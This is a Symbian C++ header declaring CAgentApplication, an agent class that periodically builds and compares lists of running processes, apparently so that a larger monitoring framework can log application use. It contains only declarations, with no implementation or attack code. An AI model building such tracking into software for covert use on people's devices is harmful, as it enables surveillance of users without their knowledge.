/*
 * AgentApplication.h
 *
 *  Created on: 24/set/2010
 *      Author: Giovanna
 */

#ifndef AGENTAPPLICATION_H_
#define AGENTAPPLICATION_H_

#include "AbstractAgent.h"
#include <HT\TimeOutTimer.h>
#include <HT\Logging.h>
#include <HT\TimeUtils.h>


typedef struct TProcItem
	{
	TUint64	pUid;
	TName	name;
	} TProcItem;

// CLASS DECLARATION

/**
 *  CAgentApplication
 * 
 */
class CAgentApplication : public CAbstractAgent, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentApplication();

	/**
	 * Two-phased constructor.
	 */
	static CAgentApplication* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentApplication* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);
    
    // Create the buffer with the process list
    HBufC8* GetListBufferL();
    
    // Swap the two proc lists
    void SwapLists();
        
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentApplication();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CTimeOutTimer* 	iTimer;
	TTimeIntervalSeconds 	iSecondsInterv;
	RArray<TProcItem>		iOldList;
	RArray<TProcItem>		iNewList;
	
	__FLOG_DECLARATION_MEMBER
	};



#endif /* AGENTAPPLICATION_H_ */
